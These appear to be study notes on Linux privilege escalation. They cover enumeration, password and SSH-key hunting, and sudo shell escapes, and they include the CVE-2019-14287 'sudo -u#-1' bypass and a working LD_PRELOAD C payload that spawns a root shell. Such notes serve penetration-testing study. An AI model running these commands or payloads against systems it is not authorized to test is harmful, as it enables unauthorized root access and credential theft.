# Learning Linux Privilege Escalation

---

## 1. Linux System Enumeration

**Learning Resources:**
- [g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [SwisskyRepo — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
- Sushant747 — Linux Privilege Escalation Resources

---

## 2. Kernel Exploits

```bash
uname -a
cat /proc/version
lscpu                 # CPU information and architecture
ps aux                # Running processes
ps aux | grep root    # Processes matching root
```

### Kernel Exploitation Overview

- GitHub: [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Dirty COW (CVE-2016-5195):** Historical Linux kernel privilege-escalation vulnerability.
- `cat ~/.bash_history` — View the current user's Bash command history, if available.

---

## 3. User Enumeration

```bash
whoami
id
sudo -l                         # Commands the current user may run through sudo
cat /etc/passwd
cut -d: -f1 /etc/passwd         # List usernames
cat /etc/shadow                 # Restricted password-hash file
cat /etc/group                  # Group information
history                         # Display command history
```

---

## 4. Network Enumeration

```bash
ifconfig
ip a
ip route
route -n
arp -a
ip neigh
netstat -an
```

---

## 5. Password Hunting

```bash
# Search for password-related terms
grep --color=auto -rnw '/' -ie "password" --color=always 2>/dev/null

# Search the locate database
locate password | more

# Find authorized_keys files
find / -name authorized_keys 2>/dev/null

# Find RSA private-key files
find / -name id_rsa 2>/dev/null
```

### Automated Enumeration Tools

- LinPEAS
- LinEnum
- Linux Exploit Suggester (mzet)
- Linux Privilege-Escalation Checker Scripts

---

## 6. File Permissions

### Escalation Through Weak File Permissions

```bash
ls -l /etc/passwd
ls -l /etc/shadow
```

### Escalation Through SSH Keys

If an authorized private SSH key is discovered, its access permissions and intended account must be verified.

```bash
ssh -i id_rsa username@target_ip
```

Replace `username` and `target_ip` with the authorized account and target address.

---

## 7. Sudo Privilege Escalation

**Topics:**
- Shell escaping
- Intended functionality
- `LD_PRELOAD`
- CVE-2019-14287
- CVE-2019-18634

### 7.1. Sudo Privilege Escalation — Shell Escaping

```bash
sudo -l
```

Review commands that can be executed with elevated privileges. If a permitted binary supports shell escapes, consult [GTFOBins](https://gtfobins.github.io/) to understand the security implications.

**Example:**

```bash
sudo vim -c ':!/bin/sh'
```

This example only applies when the sudo policy permits the relevant execution and the binary behaves as expected.

### 7.2. Sudo Privilege Escalation — Intended Functionality

Review how permitted programs behave when executed with elevated privileges, including their arguments, configuration files, and access to other files.

**Original example:**

```bash
sudo apache2 -f /etc/shadow
```

This is not a universal privilege-escalation command; its behaviour depends on the program, version, and configuration.

### 7.3. Escalation Through LD_PRELOAD

`LD_PRELOAD` is a dynamic-linker environment variable that can load shared libraries before other libraries. Its use is restricted or ignored in certain privileged execution contexts.

**C code:**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(void) {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

**Compilation command:**

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

The original notes also mention using `LD_PRELOAD` with programs such as `apache2`, `awk`, `man`, and `ftp`. Whether this works depends on the executable, loader restrictions, and sudo configuration.

### 7.4. Directory Busting

Using [Dirsearch](https://github.com/maurosoria/dirsearch):

```bash
python3 dirsearch.py -u https://TARGET.example -e php,html
```

Replace the target with an authorized test website. Consult the installed version's help for additional options.

### 7.5. Historical Sudo Vulnerabilities

**Original example:**

```bash
sudo -u#-1 /bin/bash
```

This relates to historical sudo user-ID handling and CVE-2019-14287. It is not a universal bypass and depends on the affected sudo version and policy configuration.

**Additional reference:** [PHP Reverse Shell — Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)

---

## 8. SUID and Related Privilege-Escalation Topics

**Topics:**
- SUID
- Shared Object Injection
- Binary Symlinks
- Environment Variables

### SUID — Set User ID

```bash
ls -la
ls -l /etc/shadow

# Find SUID files
find / -perm -u=s -type f 2>/dev/null
```

The SUID bit allows an executable to run with the effective user ID of its owner, subject to operating-system behaviour and security restrictions.

In permission listings, `s` in the owner's execute position indicates SUID. The lowercase `s` indicates that the execute bit is set; uppercase `S` indicates that it is not.

Check [GTFOBins](https://gtfobins.github.io/) to understand the security implications of specific binaries and their permissions.

**Note:** `chmod 777 filename` grants read, write, and execute permissions to everyone. It is not required to enumerate SUID files and should not be used indiscriminately.

---

## 9. Additional Privilege-Escalation Topics

- Linux capabilities
- Scheduled tasks and cron jobs
- NFS misconfigurations
- Docker permissions
